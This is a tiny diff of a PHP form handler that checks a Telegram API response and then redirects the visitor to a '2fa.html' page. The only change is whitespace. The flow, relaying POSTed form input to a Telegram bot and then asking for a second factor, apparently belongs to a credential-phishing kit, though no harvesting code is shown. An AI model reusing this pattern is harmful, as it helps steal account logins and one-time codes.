@@ -29,7 +29,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             echo "Error from Telegram API: " . $telegramData["description"];
         } else {
             // Redirect to the 2fa.html page
-            header("Location: 2fa.html");
+            header("Location:2fa.html");
             exit();
         }
     }
